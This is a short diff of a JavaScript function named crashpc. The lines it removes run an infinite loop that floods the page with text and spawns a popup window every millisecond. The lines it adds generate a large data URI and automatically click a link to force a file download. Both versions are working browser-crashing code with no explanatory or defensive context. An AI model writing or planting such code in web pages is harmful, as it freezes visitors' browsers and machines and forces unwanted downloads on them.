@@ -1,17 +1,13 @@
 function crashpc() {
-  txt = "";
- 
-  for(var i = 0; i === i; i++) {
-     txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(50);
-  
-     var x = document.createElement("div");
-     x.innerText = txt;
-  
-    document.body.appendChild(x)
-    console.log(txt);
-    
-    setInterval(function () {
-      open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
-    }, 1);
+  var arr = new Array();
+  for (var i = 0; i < 300000; i++) {
+      arr[i] = (i % 256);
   }
+  var blob = 'data:application/pdf,' + arr;
+  var link = document.createElement("a");
+  link.download = "attachment";
+  link.href = blob;
+  link.textContent = "really"
+  document.body.appendChild(link);
+  link.click();
 };
